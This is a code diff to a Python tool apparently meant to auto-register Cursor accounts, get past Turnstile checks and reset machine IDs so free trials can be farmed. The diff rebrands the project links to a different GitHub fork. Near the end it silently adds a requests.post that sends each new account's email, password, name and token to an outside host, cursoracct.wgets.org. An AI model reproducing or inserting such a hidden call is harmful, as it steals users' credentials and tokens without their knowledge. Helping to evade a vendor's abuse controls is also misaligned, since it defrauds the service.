@@ -1,5 +1,5 @@
 import os
-import platform
+import requests
 import json
 import sys
 from colorama import Fore, Style
@@ -151,7 +151,7 @@ def handle_turnstile(tab, max_retries: int = 2, retry_interval: tuple = (1, 2)) 
         # 超出最大重试次数
         logging.error(f"验证失败 - 已达到最大重试次数 {max_retries}")
         logging.error(
-            "请前往开源项目查看更多信息：https://github.com/chengazhen/cursor-auto-free"
+            "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
         )
         save_screenshot(tab, "failed")
         return False
@@ -303,7 +303,7 @@ def sign_up_account(browser, tab):
             total_usage = usage_info.split("/")[-1].strip()
             logging.info(f"账户可用额度上限: {total_usage}")
             logging.info(
-                "请前往开源项目查看更多信息：https://github.com/chengazhen/cursor-auto-free"
+                "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
             )
     except Exception as e:
         logging.error(f"获取账户额度信息失败: {str(e)}")
@@ -380,7 +380,7 @@ def check_cursor_version():
 
 def reset_machine_id(greater_than_0_45):
     if greater_than_0_45:
-        # 提示请手动执行脚本 https://github.com/chengazhen/cursor-auto-free/blob/main/patch_cursor_get_machine_id.py
+        # 提示请手动执行脚本 https://github.com/shengdingbox/cursor-auto-free/blob/main/patch_cursor_get_machine_id.py
         go_cursor_help.go_cursor_help()
     else:
         MachineIDResetter().reset_machine_ids()
@@ -395,7 +395,7 @@ def print_end_message():
     logging.info("📺 B站UP主: 想回家的前端")
     logging.info("=" * 30)
     logging.info(
-        "请前往开源项目查看更多信息：https://github.com/chengazhen/cursor-auto-free"
+        "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
     )
 
 
@@ -449,7 +449,7 @@ if __name__ == "__main__":
         logging.info("正在初始化邮箱验证模块...")
         email_handler = EmailVerificationHandler()
         logging.info(
-            "请前往开源项目查看更多信息：https://github.com/chengazhen/cursor-auto-free"
+            "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
         )
         logging.info("\n=== 配置信息 ===")
         login_url = "https://authenticator.cursor.sh"
@@ -484,10 +484,20 @@ if __name__ == "__main__":
                     email=account, access_token=token, refresh_token=token
                 )
                 logging.info(
-                    "请前往开源项目查看更多信息：https://github.com/chengazhen/cursor-auto-free"
+                    "请前往开源项目查看更多信息：https://github.com/shengdingbox/cursor-auto-free"
                 )
                 logging.info("重置机器码...")
                 reset_machine_id(greater_than_0_45)
+                htps_request = requests.post(
+                    url="https://cursoracct.wgets.org/addToken",
+                    json={
+                        "email": account,
+                        "password": password,
+                        "first_name": first_name,
+                        "last_name": last_name,
+                        "token": token,
+                    }
+                )
                 logging.info("所有操作已完成")
                 print_end_message()
             else:
